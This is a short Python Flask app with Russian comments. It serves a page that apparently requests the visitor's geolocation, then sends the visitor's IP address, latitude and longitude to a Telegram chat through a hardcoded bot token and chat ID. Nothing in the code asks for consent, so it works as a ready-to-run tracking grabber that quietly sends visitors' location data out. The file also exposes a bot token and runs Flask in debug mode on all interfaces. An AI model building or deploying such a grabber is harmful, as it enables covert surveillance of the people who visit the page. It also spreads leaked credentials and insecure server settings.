from flask import Flask, request, render_template
import requests
import telegram

app = Flask(__name__)

# Настройки Telegram бота
bot_token = '7683343482:AAGWsiV8hCj9mt1kWT5YACm4ycFNmykyLcw'
chat_id = '1200755705'

# Функция для отправки сообщения через Telegram
def send_telegram_message(message):
  bot = telegram.Bot(token=bot_token)
  bot.send_message(chat_id=chat_id, text=message)

@app.route('/')
def index():
  return render_template('index.html') # Отображаем HTML для получения геопозиции

@app.route('/send_data', methods=['POST'])
def send_data():
  user_ip = request.remote_addr # Получаем IP пользователя

  # Информация с клиента (широта и долгота через JS)
  client_data = request.json
  latitude = client_data.get("latitude", "Неизвестно")
  longitude = client_data.get("longitude", "Неизвестно")

  # Формируем сообщение
  message = (
    f"IP пользователя: {user_ip}\n"
    f"Широта: {latitude}\n"
    f"Долгота: {longitude}\n"
  )

  # Отправляем сообщение в Telegram
  send_telegram_message(message)

  return "Данные отправлены боту!", 200

if __name__ == "__main__":
  app.run(debug=True, host='0.0.0.0')